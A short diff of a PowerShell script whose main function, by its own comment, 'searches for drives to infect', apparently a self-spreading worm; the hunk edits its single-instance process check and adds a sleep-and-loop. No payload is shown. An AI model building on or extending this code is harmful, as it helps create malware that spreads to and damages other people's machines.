@@ -193,11 +193,12 @@ function Omega(){  #these is the main function, it searches for drives to infect
 		}
 
 	cd "C:\"
-	$proces = get-process | where-object {$_.name -eq "Omega"} | foreach-object {$_.ID}
+	$proces = get-process | where-object {$_.name -eq "Omega"} 
 	cd $loc
 	if ($proces.length -gt 1){exit}
+	
+	start-sleep 30
 	Omega   
-
 
 	}
 Omega  
